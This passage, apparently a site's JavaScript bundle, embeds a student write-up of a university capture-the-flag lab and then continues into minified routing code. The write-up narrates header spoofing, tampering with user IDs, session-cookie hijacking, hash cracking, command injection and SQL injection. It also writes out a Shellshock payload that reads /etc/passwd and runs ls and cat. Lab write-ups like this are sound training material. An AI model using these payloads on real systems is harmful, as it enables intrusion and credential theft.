again.</p>","<p><img src=\\"/cyber/writeup/unictf/image75.png\\" alt=\\"\\"></p>","<p>In the source code, we found a hidden parameter with a \u201cFalse\u201d value, we inspected the web page source code proceeded by changing the value from False to True, and submitted the form.</p>","<p><img src=\\"/cyber/writeup/unictf/image78.png\\" alt=\\"\\"></p>","<p>After applying the above-mentioned changes, we finally obtaine the page with the URL of the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image80.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 4 - Secure Browser","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 4 - Secure Browser</h2>","body":["<p>This was the URL for the Level 4:</p>","<p><code>http://eth-lab.di.uniroma1.it:55192/ogheucaiheikohhi</code></p>","<p><img src=\\"/cyber/writeup/unictf/image82.png\\" alt=\\"\\"></p>","<p>This level consisted of verifying our browser in order to have access.</p>","<p><img src=\\"/cyber/writeup/unictf/image84.png\\" alt=\\"\\"></p>","<p>Only connections from <em>Kevin Browser Rocks</em> were accepted.</p>","<p>What we had to do was to pretend to be using the browser \u201cKevin Browser Rocks\u201d by changing the headers in our browser. In order to do that we useded an extension (Simple Modify Headers, on Firefox) that modifies the header and we set it up to do it during the requests.</p>","<p><img src=\\"/cyber/writeup/unictf/image87.png\\" alt=\\"\\"></p>","<p>As we can see we modified our browser <code>user-agent</code> to <em>Kevin Browser Rocks</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image89.png\\" alt=\\"\\"></p>","<p>Nice! Now the page accepted only connections from Russian (.ru) websites. We have our extension and we can also use it to simulate Russian connection by changing our browser referrer.</p>","<p><img src=\\"/cyber/writeup/unictf/image89.png\\" alt=\\"\\"></p>","<p>By applying this new change, we could finally get the URL to access the new level.</p>","<p><img src=\\"/cyber/writeup/unictf/image90.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 5 - Headers","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 5 - Headers</h2>","body":["<p>This was the URL obtained to access the fifth level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55051/iengohquoochieza/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image47.png\\" alt=\\"\\"></p>","<p>The first thing we did was to analyze the source code.</p>","<p><img src=\\"/cyber/writeup/unictf/image49.png\\" alt=\\"\\"></p>","<p><em>\u201cNever show secret.txt to the users\u201d</em>, this caught our attention so we searched for the file called: <em>secret.txt</em>, in the current web directory. As we knew the URL was nothing else than a path to a file in a webserver, and we added <em>secret.txt</em> to the urr to the URL in order to find it.</p>","<p><img src=\\"/cyber/writeup/unictf/image51.png\\" alt=\\"\\"></p>","<p>At this point, we needed to find the secret at <em>cgi-bin/getsecret.js</em> and referred to ourselves as <em>di.uniroma1.it/supersecurepage</em>, which could be done with the Firefox extension as done in the previous levels.</p>","<p><img src=\\"/cyber/writeup/unictf/image53.png\\" alt=\\"\\"></p>","<p>After having done this, we were able to find the URL to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image55.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 6 - Your personal secret","title":"<h2> <span style=\\"color:#da1953\\">Lev</span>el 6 - Your personal secret</h2>","body":["<p>The URL for the level 6 obtained by solving the level 5:</p>","<p><code>http://eth-lab.di.uniroma1.it:55005/oaxiweitheerohra</code></p>","<p><img src=\\"/cyber/writeup/unictf/image57.png\\" alt=\\"\\"></p>","<p>Here we applied the usual method of trying one of the most common combination of username and password (admin:admin).</p>","<p><img src=\\"/cyber/writeup/unictf/image59.png\\" alt=\\"\\"></p>","<p>Digging in the source code and reading it did not reveal anything. So, we turned our attention to the URL, and we found a reference to a PHP script with the field <em>uid</em> exposed <em>userinfo.php?uid=0</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image60.png\\" alt=\\"\\"></p>","<p>The field was set to 0 which was our current user\u2019s ID, so we tried to change it with 1 and we were sent to another web page, Angelo\'s web page. Then we started to change the value of uid until we found the user with the secret at <em>uid=6</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image61.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 7 - Password protected","title":"<h2 id=LV7> <span style=\\"color:#da1953\\">Lev</span>el 7 - Password protected</h2>","body":["<p>The URL found by solving level 6:</p>","<p><code>http://eth-lab.di.uniroma1.it:55215/shieduekecometha/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image62.png\\" alt=\\"\\"></p>","<p>As stated in the picture, in order to log in we need an e-mail and the username.</p>","<p><img src=\\"/cyber/writeup/unictf/image24.png\\" alt=\\"\\"></p>","<p>So, we tried a fake and random email and a random string as a password. At that point, we noticed that the site check if the username was an e-mail just by checking if the username string contained the character <em>@</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image26.png\\" alt=\\"\\"></p>","<p>We could try to insert any kind of random email for instance <em>admin@admin</em> or even <em>teacher@something</em> but we always received the same kind of message. After having tried some standard types of email, we thought that we could try by inserting a real teacher\u2019s email address.</p>","<p>Our first attempt was to try with course main teacher&rsquo;s email but it was not the right solution. Then we tried again with our laboratorys teacher&rsquo;s email and finally, that one was the key solution for the next level because we were able to log in as a teacher and consequently obtain the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image29.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image31.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 8 - Your persona secret pt.2","title":"<h2 id=LV8> <span style=\\"color:#da1953\\">Lev</span>el 8 - Your persona secret pt.2</h2>","body":["<p>Let\u2019s start with the URL obtained from the previous levels:</p>","<p><code>http://eth-lab.di.uniroma1.it:55493/zangiepaegaizeex/cgi-bin/index.php</code></p>","<p><img src=\\"/cyber/writeup/unictf/image33.png\\" alt=\\"\\"></p>","<p>Our first attempt was as usual the standard combination of <em>admin:admin</em> as username and password.</p>","<p><img src=\\"/cyber/writeup/unictf/image35.png\\" alt=\\"\\"></p>","<p>And we noticed a code in the URL which should be the ID of the current user.</p>","<p><img src=\\"/cyber/writeup/unictf/image37.png\\" alt=\\"\\"></p>","<p>We tried to figure it out why the current user (admin) has that precise value, and we also noticed that the string <em>admin</em> and the string <em>nqzva</em> had the same length, so we started to match the characters from the first string with the ones from the other string hence <em>a=n</em>, <em>d=q</em>.</p>","<p>We immediately notice that the distance between the characters was 13, so we tried to ROT13 the string <em>admin</em> and the result string was <em>nqzva</em>.</p>","<p>After many random tries, our attention was captured by the sentence <em>\u201cPage created by MessyAdmin\u201d</em> present on the first page of the level.</p>","<p>So, we decide to ROT13 the string <em>messyadmin</em> which resulted in <em>zrfflnqzva</em> which has been copied and pasted to the URL instead of <em>nqzva</em> and we ended up with the MessyAdmin\u2019s page where we found the link to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image38.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image39.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 9 - Password protected pt.2","title":"<h2 id=LV9> <span style=\\"color:#da1953\\">Lev</span>el 9 - Password protected pt.2</h2>","body":["<p>URL obtained from the 8th level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55413/eereezeighohfeim</code></p>","<p><img src=\\"/cyber/writeup/unictf/image40.png\\" alt=\\"\\"></p>","<p>The first thing we do was to try the <em>admin@admin:admin</em> username and password combination but without success. Then we investigated the source code looking for some information and we found a comment that said <em>\u201cNever show the sessions.txt file\u201d</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image2.png\\" alt=\\"\\"></p>","<p>As usual, we proceede to change the URL trying to open the <em>sessions.txt</em> file.</p>","<p><img src=\\"/cyber/writeup/unictf/image4.png\\" alt=\\"\\"></p>","<p>After having seen the information in this file, we immediately understood what we had to do because we already knew about an attack where if you can steal a user session you can log in as that user.</p>","<p>While this session was saved in the cookie, we proceeded to open the cookie and change the value. To obtain the cookie we had to log in as a Guest user.</p>","<p><img src=\\"/cyber/writeup/unictf/image6.png\\" alt=\\"\\"></p>","<p>Once in the page, we check if we received the cookie.</p>","<p><img src=\\"/cyber/writeup/unictf/image8.png\\" alt=\\"\\"></p>","<p>We notice that the value of this cookie was different from the value found in the <em>sessions.txt</em> file.</p>","<p><img src=\\"/cyber/writeup/unictf/image10.png\\" alt=\\"\\"></p>","<p>So, we proceede to change it, and our new cookie was:</p>","<p><img src=\\"/cyber/writeup/unictf/image12.png\\" alt=\\"\\"></p>","<p>After reloading the page, we end up in the administrator\u2019s page and logged as him, where we could find the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image14.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 10 - Bytestream","title":"<h2 id=LV10> <span style=\\"color:#da1953\\">Lev</span>el 10 - Bytestream</h2>","body":["<p>The link obtained from level 9:</p>","<p><code>http://eth-lab.di.uniroma1.it:55255/leighaghuuzasaex/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image15.png\\" alt=\\"\\"></p>","<p>As usual, we tried the same combination (admin:admin) without any success.</p>","<p>Then we tried many random combinations of usernames and passwords, for instance, we used some teachers\u2019 usernames just in case we could get it correct, but it failed every time.</p>","<p>The last attempt was to analyse the source code of the web page where we found the following script:</p>","<p><img src=\\"/cyber/writeup/unictf/image16.png\\" alt=\\"\\"></p>","<p>Inside the script, there was a variable called <em>password_hashes</em> which contained the correspondent encrypted password for each user.</p>","<p><img src=\\"/cyber/writeup/unictf/image17.png\\" alt=\\"\\"></p>","<p>The first thing that came into our mind was MD5, so we proceeded to decrypt the hash with an online tool <em>haskiller.co.uk</em> (this site does not exit any more). It resulted in a very good website where it was possible to encrypt and decrypt by using various algorithms.</p>","<p>In addition, you could also download their wordlist in case you need to proceed with an offline hash cracking.</p>","<p><img src=\\"/cyber/writeup/unictf/image66.png\\" alt=\\"\\"></p>","<p>Obviously, we took the hash of the user <em>admin</em> and try to log in with the new credential <em>admin:qwertyuiop</em> and we succeeded in proceeding to the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image68.png\\" alt=\\"\\"></p>","<p>But it did not end here because after decrypting the hash we notice that the function <em>checkPassword</em> does not decrypt the user input in order to access the admin page.</p>","<p>So, we tried to reverse the function to understand its logic.</p>","<p><img src=\\"/cyber/writeup/unictf/image69.png\\" alt=\\"\\"></p>","<p>The function follows these steps:</p>","<ol>","<li>Retrieve the values from the form and hash the given password.</li>","<li>It checks if the given user as input in the login form was in the dictionary \u201cpassword_hashes\u201d, if not it gives an error.</li>","<li>If the user exists, it checks the computed hash with the stored hash, if they don\u2019t match it gives an error.</li>","<li>If the hash matches, it generates the link for the next level by hashing again the input hash and taking the initial 8 characters.</li>","</ol>","<p>We followed the script steps in order to solve the level.</p>","<p><img src=\\"/cyber/writeup/unictf/image71.png\\" alt=\\"\\"></p>","<p>In fact, we can access the right page by adding <em>62aa4dcf.html</em> as the script was doing.</p>","<p><img src=\\"/cyber/writeup/unictf/image74.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 11 - Brutus system","title":"<h2 id=LV11> <span style=\\"color:#da1953\\">Lev</span>el 11 - Brutus system</h2>","body":["<p>We started from the following URL:</p>","<p><code>http://eth-lab.di.uniroma1.it:55025/eepugeighovoorou/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image76.png\\" alt=\\"\\"></p>","<p>The first attempt was to use a few commonly used numbers such as <em>0000</em>, <em>12345</em>, <em>1337</em> but without any success.</p>","<p>As usual, we proceede to analyze the source code where we found a script like the previous levels and our attention was caught by a function called <em>checkPassword</em>.</p>","<p><img src=\\"/cyber/writeup/unictf/image79.png\\" alt=\\"\\"></p>","<p>As we can see the <code>if</code> statement checks if the number was between 1 and 1000000 excluded, if it was <em>NaN</em> (empty form) and if it hah at least six digits.</p>","<p>So, we supposed that a valid code could have been a number between 1 and 999999. Then the function hashes the code with MD5 with the salt <em>localsalt</em> and checks if the result hashing was equal to <em>4d1ea4c067daa4dec768540bbcfe80b2</em>.</p>","<p>The first idea was to decrypt the hash to retrieve the right value but due to the lack of an online tool we proceeded to hash with salt all the passwords from 1 to 99999 and check which one matched the string: <em>\u201c4d1ea4c067daa4dec768540bbcfe80b2\u201d</em>.</p>","<p>In order to do it we wrote a Python script.</p>","<p><img src=\\"/cyber/writeup/unictf/image81.png\\" alt=\\"\\"></p>","<p>And this was the result produced by the script.</p>","<p><img src=\\"/cyber/writeup/unictf/image83.png\\" alt=\\"\\"></p>","<p>As expected, the code worked fine.</p>","<p><img src=\\"/cyber/writeup/unictf/image85.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 12 - PHP","title":"<h2 id=LV12> <span style=\\"color:#da1953\\">Lev</span>el 12 - PHP</h2>","body":["<p>The URL obtained from level 11:</p>","<p><code>http://eth-lab.di.uniroma1.it:55528/ithochexephizoof</code></p>","<p><img src=\\"/cyber/writeup/unictf/image65.png\\" alt=\\"\\"></p>","<p>In this case, there was no form or text box where to write so we proceede by analyzing the code where, as usual, we found a script and we focused on a portion of the code.</p>","<p><img src=\\"/cyber/writeup/unictf/image44.png\\" alt=\\"\\"></p>","<p>Here, we can see that the script creates a new link concatenating two strings to complete the URL.</p>","<p>These strings were: <em>\u201ccgi-bin/users.php\u201d</em> and <em>\u201c?filter=\u201d</em>, after which a value was concatenated, but we didn&rsquo;t know which kind of value could follow the string.</p>","<p>We decide to copy and paste the strings to the URL to complete it ourselves and append something in order to execute an XSS since it was JavaScript.</p>","<p><img src=\\"/cyber/writeup/unictf/image45.png\\" alt=\\"\\"></p>","<p>We tried several times but for some reason, no one of our attempts worked (in addition, we were not really good in JavaScript!).</p>","<p>Then we noticed what the home page was prompting: <em>daemon</em>, <em>root</em>, and <em>mysql</em>, things that reminded us of Linux users so we tried to execute a simple Linux command instead of a JavaScript one.</p>","<p><img src=\\"/cyber/writeup/unictf/image46.png\\" alt=\\"\\"></p>","<p>Once find the files in the directory we could try to open <em>secretusers.txt</em> with the command <code>cat</code>.</p>","<p>And the file contain the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image48.png\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 13 - Shellshock","title":"<h2 id=LV13> <span style=\\"color:#da1953\\">Lev</span>el 13 - Bash Envirorment</h2>","body":["<p>The starting point was the URL obtained from the previous level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55277/neifeesuopheeghu/</code></p>","<p><img src=\\"/cyber/writeup/unictf/image50.png\\" alt=\\"\\"></p>","<p>The first thing we did was to write something in the text box to see what happens and we tried many different kinds of values to check how well it validated the input.</p>","<p><img src=\\"/cyber/writeup/unictf/image52.png\\" alt=\\"\\"></p>","<p>As usuals we proceede to analyze the code in search of information or scripts to reverse. In fact, we fpund a script, and in particular we focused our attention on the function \u201cgetenv\u201d.</p>","<p>In addition, we saw the sanitize function on the user input which removes the illegal character from the input: that was the reason why it did not generate any kind of error.</p>","<p><img src=\\"/cyber/writeup/unictf/image54.png\\" alt=\\"\\"></p>","<p>Also, here we could see the making of the URL like the previous levels so we attempted the same method as in the level 12 without any success.</p>","<p><img src=\\"/cyber/writeup/unictf/image56.png\\" alt=\\"\\"></p>","<p>The response was <i>\u201cno variable found\u201d</i> and also when we put an input it prints a <i>\u201cTESTENV\u201d</i> which recalls something similar to the bash environment variable so we decided to do some research to see if there were any vulnerabilities with the bash in the past or something similar.</p>","<p><img src=\\"/cyber/writeup/unictf/image58.png\\" alt=\\"\\"></p>","<p>The first thing we found was something called \u201cShellshock\u201d. The document explained what and how to exploit this vulnerability providing the string to use in order to execute remote shell commands.</p>","<p>The string was: <code>() { :;}; echo \u201cNS:\u201d $(&lt;/etc/passwd)</code>.</p>","<p>Digging more into the topic we found a <a href=\\"https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf\\">PDF</a> where the shellshock vulnerability was explained alongside its syntax.</p>","<p><img src=\\"/cyber/writeup/unictf/image41.png\\" alt=\\"\\"></p>","<p>So again, we tried to remake the right link appending <em>cgi-bin/env.php?filter=</em> and tried to copy and paste the string suggested but for some reason, no one of the strings were working.</p>","<p><img src=\\"/cyber/writeup/unictf/image42.png\\" alt=\\"\\"></p>","<p>During the laboratory lessons, we were suggested by the teacher to use <strong>Burp</strong> so we tried again with it.</p>","<p>The first thing we did was to copy and paste the payload found on the internet on the link like we did with the browser but without any success.</p>","<p><img src=\\"/cyber/writeup/unictf/image22.jpg\\" alt=\\"\\"></p>","<p>After a few research and random tries, we figured out that we have to encode a few characters and substitute the spaces with <em>+</em>.</p>","<p>So we encoded the \u201c:\u201d and \u201c;\u201d with \u201c%3a\u201d and \u201c%3b\u201d following the guide in this link, and our resulting payload was <code>()+{+%3a%3b}+/bin/ls</code> but still did not work for some reason.</p>","<p><img src=\\"/cyber/writeup/unictf/image23.jpg\\" alt=\\"\\"></p>","<p>Then we remembered, after a lot of struggle, a file called <em>\u201cuser.php\u201d</em> on level 12 which has a particular comment.</p>","<p><img src=\\"/cyber/writeup/unictf/image25.jpg\\" alt=\\"\\"></p>","<p>The referrer was disabled for that level and maybe it was enabled in this one, so we tried to add the referrer in our level URL.</p>","<p><img src=\\"/cyber/writeup/unictf/image27.jpg\\" alt=\\"\\"></p>","<p>Which works perfectly, and we succeeded in listing the directory content.</p>","<p>The next step was to read the <em>secret4uou0.txt</em> with the command <code>cat</code> and we sent the payload with a different command <code>/bin/cat+secret4uou0.txt</code> where we found the link for the next level.</p>","<p><img src=\\"/cyber/writeup/unictf/image30.jpg\\" alt=\\"\\"></p>","<hr>"]},{"id":"Level 14 - SQL Injection","title":"<h2 id=LV14> <span style=\\"color:#da1953\\">Lev</span>el 14 - SQL Injection</h2>","body":["<p>The starting point was the URL obtained from the previous level:</p>","<p><code>http://eth-lab.di.uniroma1.it:55424/aetiasaeghongohx</code></p>","<p>At the beginning of this level, we had no idea what to do, we try to register a user, we try to log in as <em>admin:admin</em> but nothing, then we remembered our Lab class on XSS attack and we try to do it but without success.</p>","<p>Only after few days later we had a class on SQL Injection then we tried to do so.</p>","<p>First of all, we had to find where the vulnerability was, it could be in a form, since it was very common to find them, or we could perform an injection from the URL.</p>","<p>We checked all the forms by writing inside the \u201c \u2019 \u201d character to see if we would get any query error, and we found it on the page \u201cnew user\u201d on the field \u201cusername\u201d.</p>","<p><img src=\\"/cyber/writeup/unictf/image32.PNG\\" alt=\\"\\"></p>","<p>Since the class material was not published yet we used a friend presentation about the JSQL Injection from <a href=\\"https://github.com/edoardoPredieri/SQLinjection_Training/blob/master/SQL_Injection.pptx\\">GitHub</a>.</p>","<p>So, our first attempt was to find the number of columns, by doing the queries until we reached the 6th.</p>","<p><img src=\\"/cyber/writeup/unictf/image34.jpg\\" alt=\\"\\"></p>","<p>And saw where were the leaks:</p>","<p><img src=\\"/cyber/writeup/unictf/image36.jpg\\" alt=\\"\\"></p>","<p>Once found that leaks were on row 1, 3 and 4, we tried to find the schema names with the following query.</p>","<p><img src=\\"/cyber/writeup/unictf/image19.jpg\\" alt=\\"\\"></p>","<p>The schema found did not help us.</p>","<p><img src=\\"/cyber/writeup/unictf/image20.jpg\\" alt=\\"\\"></p>","This was really helpful when there were many databases but this was not the case, so we proceeded on finding the tables.","<p><img src=\\"/cyber/writeup/unictf/image21.jpg\\" alt=\\"\\"></p>","<p>The result shows a lot of names of tables but we were looking for something particular where it was possible to find users information.</p>","<p><img src=\\"/cyber/writeup/unictf/image1.jpg\\" alt=\\"\\"></p>","<p>The \u201cusers\u201d table seemed to perfectly fit our case, so subsequently it was possible to retrieve the column names.</p>","<p><img src=\\"/cyber/writeup/unictf/image3.jpg\\" alt=\\"\\"></p>","<p>Due to a bad query without the \u201cWHERE\u201d statement it shows all the columns on the database but luckily, we managed to find the interested columns.</p>","<p><img src=\\"/cyber/writeup/unictf/image5.jpg\\" alt=\\"\\"></p>","<p>At this point we have all the necessary information to try to retrieve the credentials of the users.</p>","<p><img src=\\"/cyber/writeup/unictf/image7.jpg\\" alt=\\"\\"></p>","<p>Also, this query gives us as result few credentials (username and password) but we had to choose only two of them.</p>","<p><img src=\\"/cyber/writeup/unictf/image9.jpg\\" alt=\\"\\"></p>","After reading their blogs we found the link of the next level on Tsutomu\u2019s blog.","<p><img src=\\"/cyber/writeup/unictf/image11.jpg\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/writeup/unictf/image13.PNG\\" alt=\\"\\"></p>"]}]}]}')}},t={};function n(a){var i=t[a];if(void 0!==i)return i.exports;var r=t[a]={exports:{}};return e[a](r,r.exports,n),r.exports}(()=>{var e,t=Object.getPrototypeOf?e=>Object.getPrototypeOf(e):e=>e.__proto__;n.t=function(a,i){if(1&i&&(a=this(a)),8&i)return a;if("object"===typeof a&&a){if(4&i&&a.__esModule)return a;if(16&i&&"function"===typeof a.then)return a}var r=Object.create(null);n.r(r);var o={};e=e||[null,t({}),t([]),t(t)];for(var s=2&i&&a;"object"==typeof s&&!~e.indexOf(s);s=t(s))Object.getOwnPropertyNames(s).forEach((e=>o[e]=()=>a[e]));return o.default=()=>a,n.d(r,o),r}})(),n.d=(e,t)=>{for(var a in t)n.o(t,a)&&!n.o(e,a)&&Object.defineProperty(e,a,{enumerable:!0,get:t[a]})},n.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),n.r=e=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.p="./",(()=>{"use strict";var e,t=n(43),a=n.t(t,2),i=n(391),r=n(950),o=n.t(r,2);function s(){return s=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},s.apply(this,arguments)}!function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"}(e||(e={}));const l="popstate";function c(e,t){if(!1===e||null===e||"undefined"===typeof e)throw new Error(t)}function u(e,t){if(!e){"undefined"!==typeof console&&console.warn(t);try{throw new Error(t)}catch(n){}}}function d(e,t){return{usr:e.state,key:e.key,idx:t}}function p(e,t,n,a){return void 0===n&&(n=null),s({pathname:"string"===typeof e?e:e.pathname,search:"",hash:""},"string"===typeof t?f(t):t,{state:n,key:t&&t.key||a||Math.random().toString(36).substr(2,8)})}function h(e){let{pathname:t="/",search:n="",hash:a=""}=e;return n&&"?"!==n&&(t+="?"===n.charAt(0)?n:"?"+n),a&&"#"!==a&&(t+="#"===a.charAt(0)?a:"#"+a),t}function f(e){let t={};if(e){let n=e.indexOf("#");n>=0&&(t.hash=e.substr(n),e=e.substr(0,n));let a=e.indexOf("?");a>=0&&(t.search=e.substr(a),e=e.substr(0,a)),e&&(t.pathname=e)}return t}function m(t,n,a,i){void 0===i&&(i={});let{window:r=document.defaultView,v5Compat:o=!1}=i,u=r.history,f=e.Pop,m=null,g=y();function y(){return(u.state||{idx:null}).idx}function b(){f=e.Pop;let t=y(),n=null==t?null:t-g;g=t,m&&m({action:f,location:v.location,delta:n})}function w(e){let t="null"!==r.location.origin?r.location.origin:r.location.href,n="string"===typeof e?e:h(e);return n=n.replace(/ $/,"%20"),c(t,"No window.location.(origin|href) available to create URL for href: "+n),new URL(n,t)}null==g&&(g=0,u.replaceState(s({},u.state,{idx:g}),""));let v={get action(){return f},get location(){return t(r,u)},listen(e){if(m)throw new Error("A history only accepts one active listener");return r.addEventListener(l,b),m=e,()=>{r.removeEventListener(l,b),m=null}},createHref:e=>n(r,e),createURL:w,encodeLocation(e){let t=w(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:function(t,n){f=e.Push;let i=p(v.location,t,n);a&&a(i,t),g=y()+1;let s=d(i,g),l=v.createHref(i);try{u.pushState(s,"",l)}catch(c){if(c instanceof DOMException&&"DataCloneError"===c.name)throw c;r.location.assign(l)}o&&m&&m({action:f,location:v.location,delta:1})},replace:function(t,n){f=e.Replace;let i=p(v.location,t,n);a&&a(i,t),g=y();let r=d(i,g),s=v.createHref(i);u.replaceState(r,"",s),o&&m&&m({action:f,location:v.location,delta:0})},go:e=>u.go(e)};return v}var g;!function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"}(g||(g={}));new Set(["lazy","caseSensitive","path","id","index","children"]);function y(e,t,n){return void 0===n&&(n="/"),b(e,t,n,!1)}function b(e,t,n,a){let i=D(("string"===typeof t?f(t):t).pathname||"/",n);if(null==i)return null;let r=w(e);!function(e){e.sort(((e,t)=>e.score!==t.score?t.score-e.score:function(e,t){let n=e.length===t.length&&e.slice(0,-1).every(((e,n)=>e===t[n]));return n?e[e.length-1]-t[t.length-1]:0}(e.routesMeta.map((e=>e.childrenIndex)),t.routesMeta.map((e=>e.childrenIndex)))))}(r);let o=null;for(let s=0;null==o&&s<r.length;++s){let e=L(i);o=A(r[s],e,a)}return o}function w(e,t,n,a){void 0===t&&(t=[]),void 0===n&&(n=[]),void 0===a&&(a="");let i=(e,i,r)=>{let o={relativePath:void 0===r?e.path||"":r,caseSensitive:!0===e.caseSensitive,childrenIndex:i,route:e};o.relativePath.startsWith("/")&&(c(o.relativePath.startsWith(a),'Absolute route path "'+o.relativePath+'" nested under path "'+a+'" is not valid. An absolute child route path must start with the combined path of all its parent routes.'),o.relativePath=o.relativePath.slice(a.length));let s=O([a,o.relativePath]),l=n.concat(o);e.children&&e.children.length>0&&(c(!0!==e.index,'Index routes must not have child routes. Please remove all child routes from route path "'+s+'".'),w(e.children,t,l,s)),(null!=e.path||e.index)&&t.push({path:s,score:C(s,e.index),routesMeta:l})};return e.forEach(((e,t)=>{var n;if(""!==e.path&&null!=(n=e.path)&&n.includes("?"))for(let a of v(e.path))i(e,t,a);else i(e,t)})),t}function v(e){let t=e.split("/");if(0===t.length)return[];let[n,...a]=t,i=n.endsWith("?"),r=n.replace(/\?$/,"");if(0===a.length)return i?[r,""]:[r];let o=v(a.join("/")),s=[];return s.push(...o.map((e=>""===e?r:[r,e].join("/")))),i&&s.push(...o),s.map((t=>e.startsWith("/")&&""===t?"/":t))}const k=/^:[\w-]+$/,x=3,S=2,I=1,E=10,P=-2,T=e=>"*"===e;function C(e,t){let n=e.split("/"),a=n.length;return n.some(T)&&(a+=P),t&&(a+=S),n.filter((e=>!T(e))).reduce(((e,t)=>e+(k.test(t)?x:""===t?I:E)),a)}function A(e,t,n){void 0===n&&(n=!1);let{routesMeta:a}=e,i={},r="/",o=[];for(let s=0;s<a.length;++s){let e=a[s],l=s===a.length-1,c="/"===r?t:t.slice(r.length)||"/",u=j({path:e.relativePath,caseSensitive:e.caseSensitive,end:l},c),d=e.route;if(!u&&l&&n&&!a[a.length-1].route.index&&(u=j({path:e.relativePath,caseSensitive:e.caseSensitive,end:!1},c)),!u)return null;Object.assign(i,u.params),o.push({params:i,pathname:O([r,u.pathname]),pathnameBase:_(O([r,u.pathnameBase])),route:d}),"/"!==u.pathnameBase&&(r=O([r,u.pathnameBase]))}return o}function j(e,t){"string"===typeof e&&(e={path:e,caseSensitive:!1,end:!0});let[n,a]=function(e,t,n){void 0===t&&(t=!1);void 0===n&&(n=!0);u("*"===e||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were "'+e.replace(/\*$/,"/*")+'" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "'+e.replace(/\*$/,"/*")+'".');let a=[],i="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,((e,t,n)=>(a.push({paramName:t,isOptional:null!=n}),n?"/?([^\\/]+)?":"/([^\\/]+)")));e.endsWith("*")?(a.push({paramName:"*"}),i+="*"===e||"/*"===e?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":""!==e&&"/"!==e&&(i+="(?:(?=\\/|$))");let r=new RegExp(i,t?void 0:"i");return[r,a]}(e.path,e.caseSensitive,e.end),i=t.match(n);if(!i)return null;let r=i[0],o=r.replace(/(.)\/+$/,"$1"),s=i.slice(1);return{params:a.reduce(((e,t,n)=>{let{paramName:a,isOptional:i}=t;if("*"===a){let e=s[n]||"";o=r.slice(0,r.length-e.length).replace(/(.)\/+$/,"$1")}const l=s[n];return e[a]=i&&!l?void 0:(l||"").replace(/%2F/g,"/"),e}),{}),pathname:r,pathnameBase:o,pattern:e}}function L(e){try{return e.split("/").map((e=>decodeURIComponent(e).replace(/\//g,"%2F"))).join("/")}catch(t){return u(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding ('+t+")."),e}}function D(e,t){if("/"===t)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith("/")?t.length-1:t.length,a=e.charAt(n);return a&&"/"!==a?null:e.slice(n)||"/"}function N(e,t,n,a){return"Cannot include a '"+e+"' character in a manually specified `to."+t+"` field ["+JSON.stringify(a)+"].  Please separate it out to the `to."+n+'` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.'}function R(e){return e.filter(((e,t)=>0===t||e.route.path&&e.route.path.length>0))}function M(e,t){let n=R(e);return t?n.map(((e,t)=>t===n.length-1?e.pathname:e.pathnameBase)):n.map((e=>e.pathnameBase))}function z(e,t,n,a){let i;void 0===a&&(a=!1),"string"===typeof e?i=f(e):(i=s({},e),c(!i.pathname||!i.pathname.includes("?"),N("?","pathname","search",i)),c(!i.pathname||!i.pathname.includes("#"),N("#","pathname","hash",i)),c(!i.search||!i.search.includes("#"),N("#","search","hash",i)));let r,o=""===e||""===i.pathname,l=o?"/":i.pathname;if(null==l)r=n;else{let e=t.length-1;if(!a&&l.startsWith("..")){let t=l.split("/");for(;".."===t[0];)t.shift(),e-=1;i.pathname=t.join("/")}r=e>=0?t[e]:"/"}let u=function(e,t){void 